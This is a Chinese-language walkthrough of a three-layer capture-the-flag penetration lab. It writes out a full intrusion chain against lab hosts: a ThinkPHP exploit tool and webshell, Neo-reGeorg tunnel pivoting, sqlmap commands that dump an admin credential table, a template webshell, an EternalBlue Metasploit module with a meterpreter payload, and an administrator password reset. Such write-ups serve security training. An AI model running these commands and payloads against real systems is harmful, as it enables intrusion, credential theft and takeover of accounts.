# CFS三层靶机

靶机地址：http://cloud-pentest.cn/index.html#;

网络拓扑图：

![截图](939fb92d7fb83cb816ca7d3589f7b7e3.png)

![截图](23aa00204c6385c13e1b4880bc23d920.png)

工具准备:

- nmap
- fscan
- ThinkPHP_getshell-v2.exe ThinkPHP漏洞利用工具
- 蚁剑
- proxychains4
- sqlmap
- Neo-regeorg

攻击机信息：

```
┌──(root㉿kali)-[/home/tom/桌面]
└─# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.106.128  netmask 255.255.255.0  broadcast 192.168.106.255
        inet6 fe80::20c:29ff:feab:94e2  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:ab:94:e2  txqueuelen 1000  (Ethernet)
        RX packets 6501061  bytes 3322102671 (3.0 GiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4268971  bytes 583608839 (556.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8345  bytes 28506889 (27.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8345  bytes 28506889 (27.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.8.0.170  netmask 255.255.255.255  destination 10.8.0.169
        inet6 fe80::2fd9:634a:9163:51ff  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 38  bytes 4155 (4.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2079  bytes 79733 (77.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

# 渗透流程：

## 172.25.0.13

### nmap

```
┌──(root㉿kali)-[/home/tom/桌面]
└─# nmap -sn 172.25.0.1/24
Starting Nmap 7.94 ( https://nmap.org ) at 2024-07-30 00:54 CST
Nmap scan report for 172.25.0.1
Host is up (0.085s latency).
Nmap scan report for 172.25.0.13
Host is up (0.16s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 11.01 seconds
```

### fscan

![截图](a2e539d69d7f8cc981faf080413eec40.png)

我们可以看到靶机172.25.0.13存活，并开放了22，80，21等端口。

访问下网站：

![截图](765f4f7ce7ffbf447bc25c7348167f37.png)

我们发现是Thinkphp5.x框架，我们可以尝试相关exp，下面我们发现确实存在漏洞。

![截图](a910f9ec34834ace5b987d1d9714d1b3.png)

直接掏出工具扫一波，存在漏洞。

![截图](0245d010fde7bdf97153731b8717ed2f.png)

利用该工具写入shell，之后使用蚁剑连接。

![截图](39f46b2f3099d9e0fb11ce2b8508d2c9.png)

访问php，验证上传shell成功。

![截图](a8f2067f6d16c0c63547e9f52f8404d4.png)

蚁剑连接成功了

![截图](edcf0913da63b048f917ce2e3fc85ed2.png)

成功找到第一个flag。

![截图](6555f8590aa211a7090a2209aa86b358.png)

先信息收集一波

```
查内核
uname -an
查ip
ifconfig
ip a
查路由
route

```

![截图](949a0a9030637f262d4a61165c0f495d.png)

![截图](2db50350537ce3e98eb35221e1f6fcba.png)

![截图](abcf534759dda7c030ddc437b9e89a10.png)

![截图](e605cd3705681a126e09e162f9a8746e.png)

我们发现当前靶机还处于192.168.22的网段下，下面我们建立代理。

这里我们使用neo-regeorg，使用的主要命令如下：

![截图](989754a466c406dea3fd909ae9f689e9.png)

首先生成通道文件，key设置为password，之后将tunnel.php上传到网站的根目录下，与此同时我们的攻击机与通道文件建立sock5代理连接。

```
┌──(root㉿kali)-[/home/tom/桌面/tools/Neo-reGeorg-5.2.0]
└─# python neoreg.py generate -k password


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 5.2.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.go
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.jsp

┌──(root㉿kali)-[/home/tom/桌面/tools/Neo-reGeorg-5.2.0]
└─# python3 neoreg.py -k password  -u http://172.25.0.13/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 5.2.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting SOCKS5 server [127.0.0.1:1080]
  Tunnel at:
    http://172.25.0.13/tunnel.php
+------------------------------------------------------------------------+
```

上传tunnel.php到网站根目录，

![截图](7427d2b3981fb3ec7b8ce7576319afd2.png)

建立成功后，我们上传fscan_amd64到该靶机，进行网段扫描。

```
chmod 777 fscan_amd64
 
./fscan_amd64
```

扫到192.168.22.22。

之后设置火狐浏览器代理，使用socks5进行连接。

![截图](e8e9714ad3605d97c0ce39a4a84a4243.png)

## 192.168.22.22

访问成功。

![截图](56e83070dfe3d94ece822fa04d4f6d49.png)

查看/robots.txt

![截图](23808e3af75a0cfe8f53229dcf708973.png)

根据提示可以找到登录界面http://192.168.22.22/index.php?r=admini/public/login

![截图](352552eaf8b907f3659ecad7e8aa92f5.png)

尝试登陆后，发现该接口可能存在sql注入漏洞，使用sqlmap进行测试。

```
sqlmap -u "http://192.168.22.22/index.php?r=vul&keyword=1" --batch --dbs --proxy=socks5://127.0.0.1:1080
```

![截图](2ff27f929842ffa6ad40d95913420a9e.png)

```
sqlmap -u "http://192.168.22.22/index.php?r=vul&keyword=1" --batch -D bagecms --tables  --proxy=socks5://127.0.0.1:1080
```

![截图](7c98a95e7c54fdc48015ed95a35ac694.png)

```
sqlmap -u "http://192.168.22.22/index.php?r=vul&keyword=1" --batch -D bagecms -T bage_admin --columns  --proxy=socks5://127.0.0.1:1080
```

![截图](11bfc5ef8e8863eadfb0cb792ed58998.png)

```
sqlmap -u "http://192.168.22.22/index.php?r=vul&keyword=1" --batch -D bagecms -T bage_admin -C username,password --dump --proxy=socks5://127.0.0.1:1080
```

![截图](6916dfed5aae172ef88ac302ec253ac1.png)

成功登录。

![截图](9be31b4d3d41cb40d0e346f70a823189.png)

模板里面可以插入一句话木马。

![截图](256d9ed729ed4a34911767d6362eeaab.png)

访问页面，确认马url的路径

![截图](919346a7f210b3082e10ebb150f93e5d.png)

蚁剑设置sock5代理

![截图](3f1f557d152caa62ac6cd4eb2a297449.png)

尝试连接

![截图](3893f0dd1afb3443e93802a15845678a.png)

信息搜集，我们发现该靶机还处于192.168.33的网段。

![截图](4c10651beed6b766fe7c3ece194d2a9c.png)

上传neo到第一台靶机中，并将生成的tunnel.php上传到192.168.22.22靶机中。

![截图](77014e2309d1087d68de1882d8a68e82.png)

<br/>

![截图](bbee40bc3cca25de4a4815f6b200a045.png)

<br/>

![截图](08b52212759ee526fb7fdafa65207d1e.png)

可以先查看一下172.25.0.13靶机能不能用python，有没有python环境

![截图](45b1e5f197737d7a9184a9c965fab033.png)

然后开启代理建立连接。

```
python neoreg.py -k password -u http://192.168.22.22/tunnel.php -l 0.0.0.0 -p 2001
```

![截图](982c676f04564e8cdd4a0f6f602cbd3b.png)

## 192.168.33.33

我们在攻击机使用nmap扫描33网段 。

```
proxychains4 nmap -Pn -sT 192.168.33.0/24
```

这里使用proxychains4需要配置/etc/proxychains.conf，但是我这里一直出问题。

发现这是开放着445、3389端口的Windows系统

![截图](697434f720c9a4ca03cd5deda3fc5c28.png)

利用永恒之蓝漏洞。

```
msfconsole 
use exploit/windows/smb/ms17_010_psexec
set payload windows/meterpreter/bind_tcp
set RHOST 192.168.33.33
options
run
```

![截图](e4187045bf8597e225f3d6585165926b.png)

```
meterpreter > shell
C:\Windows\system32>net user
C:\Windows\system32>net user Administrator 123
```